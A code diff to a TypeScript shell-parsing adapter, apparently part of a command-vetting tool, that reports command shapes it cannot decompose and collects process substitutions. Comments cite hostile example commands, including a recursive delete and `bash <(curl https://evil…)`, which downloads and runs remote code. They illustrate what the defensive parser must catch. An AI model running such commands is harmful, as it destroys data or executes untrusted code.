@@ -78,6 +78,16 @@ export interface ShellCommand {
 	 *  top level, so `echo "$(rm -rf build)"` reports the delete as its own
 	 *  command and marks it nested. */
 	nested: boolean;
+	/**
+	 * Set when this entry stands for a command shape the adapter could not
+	 * decompose, naming the shape. It carries no words, and a caller must read
+	 * it as "something ran here that was not read" rather than as nothing.
+	 *
+	 * Silence was the alternative, and it failed open: `time rm -rf build` and
+	 * `coproc rm -rf build` produced an empty command list, which every caller
+	 * would have read as a command that does nothing.
+	 */
+	unreadShape?: string;
 }
 
 export type ShellParse = { ok: true; commands: ShellCommand[] } | { ok: false; reason: string };
@@ -190,37 +200,83 @@ function collectStmt(stmt: any, join: ShellJoin, nested: boolean, source: string
 		}));
 		out.push({ words, assigns, redirects, join, nested });
 		// A substitution runs its own commands, and they are commands: the
-		// delete in `echo "$(rm -rf build)"` is a delete.
-		for (const word of [...(cmd.Args ?? []), ...(cmd.Assigns ?? []).map((a: any) => a.Value).filter(Boolean)]) {
-			collectSubstitutions(word, source, out);
-		}
+		// delete in `echo "$(rm -rf build)"` is a delete. One walk over the
+		// whole call rather than one per word, because each walk crosses into
+		// the Go build and that cost is per node visited, not per call.
+		collectSubstitutions(cmd, source, out);
 		return;
 	}
-	// Every other command shape — a subshell, a block, a loop, a case, a
-	// function — contributes its redirects and then its own statements.
+	// Every other command shape: a subshell, a block, a loop, a conditional, a
+	// function, `time`, `coproc`, or whatever the grammar gains next. The
+	// statements inside are found by walking rather than by enumerating the
+	// shapes, because an enumeration that misses one drops every command under
+	// it silently — which is how `time rm -rf build` came to summarize as
+	// nothing at all.
 	if (redirects.length > 0) out.push({ words: [], assigns: [], redirects, join, nested });
-	for (const inner of innerStmts(cmd)) collectStmt(inner, join, nested, source, out);
+	// A compound's header is not a statement and carries commands of its own:
+	// the `$(ls)` of `for f in $(ls)`. Statements own the substitutions inside
+	// them, so this walk stops at each one.
+	const substitutions = collectSubstitutions(cmd, source, out);
+	const inner = shallowStmts(cmd);
+	for (const stmt of inner) collectStmt(stmt, join, nested, source, out);
+	// Nothing read at all is still a command that ran.
+	if (inner.length === 0 && substitutions === 0 && cmd) {
+		out.push({ words: [], assigns: [], redirects: [], join, nested, unreadShape: type });
+	}
 }
 
+/**
+ * The shallowest statements inside a node: the walk stops descending as soon
+ * as it finds one, so a nested compound is collected once by its own
+ * recursion rather than twice.
+ */
 // biome-ignore lint/suspicious/noExplicitAny: untyped AST
-function innerStmts(cmd: any): any[] {
+function shallowStmts(cmd: any): any[] {
 	if (!cmd) return [];
-	const type = nodeType(cmd);
-	if (type === "Subshell" || type === "Block") return cmd.Stmts ?? [];
-	if (type === "IfClause") return [...(cmd.Cond ?? []), ...(cmd.Then ?? []), ...(cmd.Else ? innerStmts(cmd.Else) : [])];
-	if (type === "WhileClause" || type === "ForClause") return [...(cmd.Cond ?? []), ...(cmd.Do ?? [])];
-	if (type === "FuncDecl") return cmd.Body ? [cmd.Body] : [];
-	if (type === "CaseClause") return (cmd.Items ?? []).flatMap((item: any) => item.Stmts ?? []);
-	return [];
+	const found: any[] = [];
+	syntax.Walk(cmd, (node: unknown) => {
+		if (!node) return true;
+		const type = nodeType(node);
+		// A substitution's statements belong to collectSubstitutions, which
+		// marks them nested. Collecting them here as well reported the command
+		// inside `declare KEY=$(op read …)` twice.
+		if (type === "CmdSubst" || type === "ProcSubst") return false;
+		if (type === "Stmt") {
+			found.push(node);
+			return false;
+		}
+		return true;
+	});
+	return found;
 }
 
-/** Every command substitution inside a word, as commands. */
+/**
+ * Every substitution inside a node, as commands, and how many statements they
+ * contributed.
+ *
+ * Both spellings count. `$(…)` runs its commands for their output; `<(…)` runs
+ * them for a file descriptor, which is how `bash <(curl https://evil…)` runs a
+ * download without ever naming a pipe.
+ */
 // biome-ignore lint/suspicious/noExplicitAny: untyped AST
-function collectSubstitutions(word: any, source: string, out: ShellCommand[]): void {
-	walk(word, node => {
-		if (nodeType(node) !== "CmdSubst") return;
-		for (const stmt of node.Stmts ?? []) collectStmt(stmt, "sequence", true, source, out);
+function collectSubstitutions(node: any, source: string, out: ShellCommand[]): number {
+	let collected = 0;
+	syntax.Walk(node, (inner: unknown) => {
+		if (!inner) return true;
+		const type = nodeType(inner);
+		// A statement owns the substitutions inside it, and collectStmt has
+		// already been given it. Descending here would collect them twice.
+		if (type === "Stmt") return false;
+		if (type !== "CmdSubst" && type !== "ProcSubst") return true;
+		// biome-ignore lint/suspicious/noExplicitAny: untyped AST
+		for (const stmt of (inner as any).Stmts ?? []) {
+			collectStmt(stmt, "sequence", true, source, out);
+			collected += 1;
+		}
+		// Its own statements were just collected, and each recurses on its own.
+		return false;
 	});
+	return collected;
 }
 
 const joinOf = (op: number): ShellJoin => {
